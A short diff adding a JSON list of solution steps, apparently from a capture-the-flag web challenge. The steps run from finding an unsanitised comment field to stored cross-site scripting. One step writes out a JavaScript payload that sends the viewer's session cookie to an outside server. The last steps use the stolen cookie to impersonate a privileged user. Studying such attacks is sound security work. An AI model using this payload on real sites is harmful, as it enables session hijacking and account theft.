@@ -1,0 +1,7 @@
+[
+    "Noted that the web application allowed users to post comments without any proper sanitization or validation of user input, making it vulnerable to Cross-Site Scripting (XSS) attacks",
+    "Submitted a comment containing a simple JavaScript payload (e.g. <script>alert(1);</script>) to test for XSS vulnerability",
+    "Crafted a comment containing JavaScript code that would send the user's session cookie to my own server (e.g. var xhttp = new XMLHttpRequest(); xhttp.open(\"GET\", \"http://my-server.com/steal-cookie?cookie=\" + encodeURIComponent(document.cookie), true); xhttp.send();)",
+    "Waited for a privileged user to view the comment and trigger the JavaScript payload, thereby sending their session cookie to my server",
+    "Used the stolen session cookie to impersonate the privileged user and access the restricted area containing the flag"
+]
